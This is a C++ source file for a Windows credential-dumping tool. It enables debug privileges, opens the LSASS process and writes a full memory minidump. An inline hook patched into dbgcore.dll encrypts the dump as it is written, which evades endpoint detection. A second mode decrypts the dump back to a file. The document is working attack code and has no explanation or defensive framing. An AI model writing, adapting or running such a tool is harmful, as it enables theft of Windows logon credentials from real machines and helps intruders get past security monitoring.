#include "utils.h"
#include "handle.h"
#include <Windows.h>
#include <stdio.h>
#include <DbgHelp.h>
#include<tlhelp32.h>
#include<iostream>
using namespace std;
#pragma comment (lib, "Dbghelp.lib")
char* writeAll_abs;
HANDLE hProcess;
HANDLE our_dmp_handle;
int key = 66;
int opt;
char* EXPORT_PATH;
char overwritten_writeAll[13];
char trampoline_assembly[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
    0x41, 0xFF, 0xE2                                                    // jmp r10
};
void minidumpThis(HANDLE hProc)
{
    our_dmp_handle = CreateFileA(EXPORT_PATH, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!our_dmp_handle)
    {
        printf("No dump for you. Wrong file\n");
    }
    else
    {
        DWORD lsassPid = GetProcessId(hProc);
        BOOL Result = MiniDumpWriteDump(hProc, lsassPid, our_dmp_handle, MiniDumpWithFullMemory, NULL, NULL, NULL);
        CloseHandle(our_dmp_handle);
        if (!Result)
        {
            printf("No dump for you. Minidump failed\n");
        }
    }
    return;
}
unsigned char* hoot(void* buffer, INT64 size, long pos) {
    unsigned char* new_buff = (unsigned char*)buffer;
    new_buff = encrypt(buffer, size);
    return new_buff;
}

UINT32 _hoot_trampoline(HANDLE file_handler, void* buffer, INT64 size) {
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &overwritten_writeAll, sizeof(overwritten_writeAll), NULL);

    long high_dword = NULL;
    DWORD low_dword = SetFilePointer(our_dmp_handle, NULL, &high_dword, FILE_CURRENT);
    long pos = high_dword << 32 | low_dword;

    unsigned char* new_buff = hoot(buffer, size, pos);

    UINT32 ret = ((UINT32(*)(HANDLE, void*, INT64))(writeAll_abs))(file_handler, (void*)new_buff, size);      // erg...
    free(new_buff);
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);

    return ret;
}

bool parse_args(int argc, char* args[]) {
    bool success = false;
    if (argc == 3) {
        opt = atoi(args[1]);
        EXPORT_PATH = args[2];
        success = true;
    }
    return success;
}
int main(int argc, char* args[])
{
    srand(key);
    if (!parse_args(argc, args))
        return -1;
    if (opt == 1)
    {
        if (!IsElevated()) {
            printf("not admin\n");
            return -1;
        }
        if (!SetDebugPrivilege()) {
            printf("no SeDebugPrivs\n");
            return -1;
        }
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());
        const char* dbgcore_name = "dbgcore.dll";
        HINSTANCE  dbgcore_handle = LoadLibraryA(dbgcore_name);
        WORD writeAll_offset = 0xE430;
        writeAll_abs =(char*)dbgcore_handle + writeAll_offset;
        void* _hoot_trampoline_address = (void*)_hoot_trampoline;
        memcpy(&trampoline_assembly[2], &_hoot_trampoline_address, sizeof(_hoot_trampoline_address));
        memcpy(overwritten_writeAll, (void*)writeAll_abs, sizeof(overwritten_writeAll));
        WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);
        HANDLE lsassProcess_handle = NULL;
        lsassProcess_handle= enum_lsass_handles();
        minidumpThis(lsassProcess_handle);
        CloseHandle(lsassProcess_handle);
        CloseHandle(hProcess);
    }
    else if (opt == 2) {
        HANDLE file = CreateFileA(EXPORT_PATH, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
        long long size = GetFileSize(file, NULL);
        unsigned char* bytes = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
        ReadFile(file, (LPVOID)bytes,(DWORD) size, NULL, NULL);
        bytes = encrypt(bytes, size);
        HANDLE file2 = CreateFileA((LPCSTR)"sec.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (!WriteFile(file2, bytes, size, NULL, NULL)) {
            cout << "Error writing to file" << endl;
            return 1;
        }
        CloseHandle(file2);
        CloseHandle(file);
    }
    else {
        cout << "erro args" << endl;
    }
    return 0;
}
